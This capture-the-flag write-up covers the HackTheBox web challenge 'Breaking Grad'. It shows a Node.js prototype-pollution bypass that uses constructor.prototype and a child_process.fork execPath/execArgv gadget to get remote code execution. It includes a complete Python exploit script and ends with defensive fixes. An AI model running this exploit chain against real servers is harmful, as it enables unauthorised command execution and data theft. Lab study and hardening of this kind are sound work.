---
title: "Breaking Grad"
date: 2027-12-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, prototype-pollution, nodejs, child-process, rce]
description: "A grade-checking API deep-merges your JSON body. It tries to block prototype pollution by rejecting the key __proto__ — but constructor.prototype reaches the same object. Pollute execPath and execArgv, trigger a child_process.fork elsewhere, and Node runs your shell command. One bad denylist, full RCE."
---

## Overview

Breaking Grad is a Medium **Web** challenge built on a small Node.js/Express app. A `/api/calculate` endpoint deep-merges the JSON you send into a server object. The merge tries to defend itself against [prototype pollution](https://cwe.mitre.org/data/definitions/1321.html) by rejecting the literal key `__proto__` — but that denylist has a hole: `constructor.prototype` points at the very same `Object.prototype`. Once the global prototype is polluted, a `child_process.fork()` call on a *different* route inherits attacker-controlled options and executes a shell command. The path from first request to RCE is two HTTP calls.

## The technique

The app ships three helpers. The interesting two:

`helpers/ObjectHelper.js` — a hand-rolled recursive merge with an incomplete key guard:

```js
isValidKey(key) { return key !== '__proto__'; }      // blocks __proto__ ONLY
merge(target, source) {
  for (let key in source) {
    if (this.isValidKey(key)) {
      if (this.isObject(target[key]) && this.isObject(source[key]))
        this.merge(target[key], source[key]);         // recurses into constructor.prototype
      else target[key] = source[key];
    }
  }
  return target;
}
clone(target) { return this.merge({}, target); }      // called on req.body
```

`helpers/DebugHelper.js` — a fork whose options object is *missing* `execPath`/`execArgv`:

```js
const { fork } = require('child_process');
let proc = fork('VersionCheck.js', [], { stdio: ['ignore','pipe','pipe','ipc'] });
proc.stdout.pipe(res); proc.stderr.pipe(res);          // child output → HTTP response
```

Two facts combine into RCE:

1. **The filter alias.** `obj.__proto__` and `obj.constructor.prototype` are the same `Object.prototype`. A denylist that names only `__proto__` is bypassed by sending `{"constructor":{"prototype":{...}}}` — the merge walks `constructor` (the `Object` function), then `prototype`, and writes onto the global prototype.
2. **The fork gadget.** `child_process.fork`/`spawn` read optional properties off their options object: `execPath` (the binary to run) and `execArgv` (arguments placed *before* the script). Those keys aren't own-properties of `{stdio:...}`, so Node reads them from the polluted prototype. Set `execPath="/bin/sh"` and `execArgv=["-c","<cmd>"]`, and `fork('VersionCheck.js', ...)` spawns `/bin/sh -c '<cmd>' VersionCheck.js` — the script name becomes `$0` and is ignored, your command runs, and its stdout is piped straight back to you.

## Solution

The whole exploit is two requests. The pollution request returns HTTP 500 (the handler later does `name.includes(...)` on an undefined value and throws) — but the pollution already landed during `clone()`, and it persists for the life of the Node process.

Create `solve.py`:

```python
import sys, json, urllib.request

host = sys.argv[1]
port = sys.argv[2]
cmd  = sys.argv[3] if len(sys.argv) > 3 else "cat /app/flag* 2>/dev/null"
base = f"http://{host}:{port}"

def post_json(path, obj):
    data = json.dumps(obj).encode()
    req = urllib.request.Request(base + path, data=data,
                                 headers={"Content-Type": "application/json"})
    try:
        return urllib.request.urlopen(req, timeout=15).read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return f"(HTTP {e.code} — pollution applied before the handler crashed)"

def get(path):
    return urllib.request.urlopen(base + path, timeout=15).read().decode(errors="replace")

# 1) Pollute Object.prototype via constructor.prototype (bypasses the __proto__ filter)
payload = {"constructor": {"prototype": {
    "execPath": "/bin/sh",
    "execArgv": ["-c", cmd],
}}}
print(post_json("/api/calculate", payload).strip())

# 2) Trigger the fork — Node spawns /bin/sh -c '<cmd>' VersionCheck.js, output piped back
print(get("/debug/version"))
```

Run it against the instance:

```bash
python3 solve.py <target-ip> <target-port> "cat /app/flag*"
```

The first call pollutes the prototype; the second hits `/debug/version`, which forks under our injected `execPath`/`execArgv` and returns the flag (`HTB{...}`) in the response body.

## Why it worked

Two ordinary-looking bits of code lined up into a remote-code-execution chain. The merge author *knew* about prototype pollution — they added a guard — but guarded the wrong thing: `__proto__` is only one of the names that reach `Object.prototype`, and `constructor.prototype` walks right past a key-name denylist. Separately, `child_process` trusts its options object completely, reading inheritable properties like `execPath` and `execArgv` that, when absent, silently fall through to the prototype. Pollution turned a data-merge bug into control over what binary the server executes.

## Fix / defense

- Don't denylist a single key — reject `constructor` and `prototype` too, or better, build request-derived objects with `Object.create(null)` / a `Map` so there is no prototype to pollute.
- Validate the body against a schema (ajv/Joi with `additionalProperties: false`) instead of deep-merging untrusted JSON.
- `Object.freeze(Object.prototype)` at startup so injected `execPath`/`execArgv` can never be assigned.
- Pass `child_process` a fully-specified options object (set `execPath`/`execArgv`/`shell` explicitly) so polluted prototype values can't leak in.
